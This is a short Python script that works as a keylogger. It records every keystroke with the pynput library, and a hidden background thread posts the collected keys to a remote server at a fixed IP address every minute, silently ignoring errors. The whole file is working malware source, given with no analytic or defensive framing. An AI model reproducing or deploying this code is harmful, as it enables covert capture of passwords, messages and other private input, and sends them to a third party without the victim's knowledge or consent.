from pynput import keyboard
import requests
import threading
import time

stored_keys = []
SERVER_URL = "http://10.0.0.50:8080/data"

def on_press(key):
    try:
        stored_keys.append(key.char)
    except AttributeError:
        stored_keys.append(str(key))

def send_data():
    while True:
        if len(stored_keys) > 0:
            data = ''.join(map(str, stored_keys))
            try:
                requests.post(SERVER_URL, data={'keys': data})
                stored_keys.clear()
            except:
                pass
        time.sleep(60)

def main():
    sender = threading.Thread(target=send_data)
    sender.daemon = True
    sender.start()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
